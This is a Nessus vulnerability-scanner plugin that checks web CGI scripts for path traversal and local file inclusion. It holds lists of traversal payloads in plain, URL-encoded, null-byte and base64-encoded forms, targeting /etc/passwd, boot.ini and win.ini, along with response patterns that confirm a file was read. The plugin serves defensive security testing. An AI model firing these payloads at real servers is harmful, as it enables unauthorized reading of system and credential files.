#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(39467);
 script_version("$Revision: 1.25 $");
 script_cvs_date("$Date: 2017/01/05 15:28:31 $");

 script_name(english:"CGI Generic Path Traversal");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be accessed or executed on the remote host.");
 script_set_attribute(attribute:"description", value:
"The remote web server hosts CGI scripts that fail to adequately sanitize
request strings and are affected by directory traversal or local files
inclusion vulnerabilities.

By leveraging this issue, an attacker may be able to read arbitrary
files on the web server or execute commands.");
 script_set_attribute(attribute:"see_also", value:"http://en.wikipedia.org/wiki/Directory_traversal");
 script_set_attribute(attribute:"see_also", value:"http://cwe.mitre.org/data/definitions/22.html");

 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/Path-Traversal");
 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/Null-Byte-Injection");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4de3840d");

 script_set_attribute(attribute:"solution", value:
"Restrict access to the vulnerable application. Contact the
vendor for a patch or upgrade.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cwe_id(
  21,  # Pathname Traversal and Equivalence Errors
  22,  # Path Traversal
  632, # Weaknesses that Affect Files or Directories
  715, # OWASP Top Ten 2007 Category A4 - Insecure Direct Object Reference
  723, # OWASP Top Ten 2004 Category A2 - Broken Access Control
  813, # OWASP Top Ten 2010 Category A4 - Insecure Direct Object References
  928, # Weaknesses in OWASP Top Ten 2013
  932  # OWASP Top Ten 2013 Category A4 - Insecure Direct Object References
 );
 script_set_attribute(attribute:"plugin_publication_date", value:"2009/06/19");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_xref(name:"OWASP", value:"OWASP-AZ-001");

 script_summary(english:"Tortures the arguments of the remote CGIs (traversal)");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl", "os_fingerprint.nasl", "torture_cgi_load_estimation1.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/enable_web_app_tests");
 script_timeout(43200);	# Timeout is managed by the script itself
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi.inc");

function torture_cgi_response_post_check(resp) { return 0; }	# stub

####

i = 0;
unix_flaws = make_array(
"/etc/passwd",						"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd",			"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00",		"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00.html",		"RE:root:.*:0:[01]:",
"../../../../../../../../etc/passwd%00index.html",	"RE:root:.*:0:[01]:",
"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",	"RE:root:.*:0:[01]:",
# this one is ../../../etc/passwd uuencoded - at least one cgi was vulnerable to this.
"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAo=",		"RE:root:.*:0:[01]:",
"%60/etc/passwd%60",					"RE:root:.*:0:[01]:",

"/etc",							"ST:resolv.conf",
"../../../../../../../../etc",				"ST:resolv.conf",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc",		"ST:resolv.conf",
"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc",	"ST:resolv.conf" );

win_flaws = make_array(
'..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini',	'RE:\\[boot( |%20)loader\\]',
'../../../../../../../../../boot.ini',		'RE:\\[boot( |%20)loader\\]',
'..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00.htm',	'RE:\\[boot( |%20)loader\\]',
'../../../../../../../../../boot.ini%00.txt',		'RE:\\[boot( |%20)loader\\]',

'..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',	"ST:[windows]",
"../../../../../../../../windows/win.ini",		"ST:[windows]",
'..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini',	"ST:[fonts]",
"../../../../../../../../winnt/win.ini",		"ST:[fonts]",

"../../../../../../../winnt",		"PI:*system.ini*",
"../../../../../../../windows",		"PI:*system.ini*",
'..\\..\\..\\..\\..\\..\\..\\windows',	"PI:*system.ini*",
'..\\..\\..\\..\\..\\..\\..\\winnt',	"PI:*system.ini*"
);

if (experimental_scripts || thorough_tests)
{
  foreach k (make_list( "..../..../..../..../..../..../..../..../etc/passwd",
  	    		".../.../.../.../.../.../.../.../etc/passwd" ))
    unix_flaws[k] = "RE:root:.*:0:[01]:";

  foreach k (make_list( '....\\....\\....\\....\\....\\....\\....\\....\\....\\boot.ini',
			'...\\...\\...\\...\\...\\...\\...\\...\\...\\boot.ini'))
    win_flaws[k] = 'RE:\\[boot( |%20)loader\\]';

}

unix = 0; win = 0;
if (!get_kb_item("Settings/PCI_DSS") && (thorough_tests || report_paranoia > 1))
{
  # Even if the web server is based on Unix (for example), it may call a
  # back-end which runs on Windows.
  unix = 1; win = 1;
}
else
{
  os = get_kb_item("Host/OS");
  if (! os)
  {
    debug_print('Unknown OS - enabling all attacks\n');
    unix = 1; win = 1;
  }
  else
  {
    if ("Windows" >< os) win = 1;
    if (egrep(string: os, pattern: "BSD|Linux|Unix|AIX|HP-UX|Mac OS X", icase: 1)) unix = 1;
  }
}

if (! unix && ! win)
{
  debug_print("No attack for OS ", os);
  exit(0, "Will not attack OS "+os);
}

if (unix)
  foreach k (keys(unix_flaws))
    flaws_and_patterns[k] = unix_flaws[k];
if (win)
  foreach k (keys(win_flaws))
    flaws_and_patterns[k] = win_flaws[k];

port = torture_cgi_init(vul:'TD');


report = torture_cgis(port: port, vul: "TD");

if (strlen(report) > 0)
{
  security_warning(port:port, extra: report);
}
